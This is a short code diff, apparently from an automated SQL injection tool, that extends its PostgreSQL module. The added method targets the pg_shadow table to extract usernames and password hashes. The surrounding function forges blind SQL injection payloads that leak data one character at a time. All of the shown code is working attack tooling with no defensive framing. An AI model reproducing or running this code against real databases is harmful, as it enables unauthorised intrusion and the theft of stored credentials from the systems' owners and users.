@@ -70,6 +70,13 @@ class PostgresMole(DbmsMole):
             'table' : ''
         }
 
+    def _user_creds_query_info(self):
+        return {
+            'field'  : ['usename', 'passwd'],
+            'table'  : 'pg_shadow',
+            'filter' : '1=1'
+        }
+
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
         if table == 'pg_tables' and where == "1=1" and len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             return ' and {op_par}' + str(value) + ' < (select distinct on(schemaname) ascii(substring(schemaname, '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
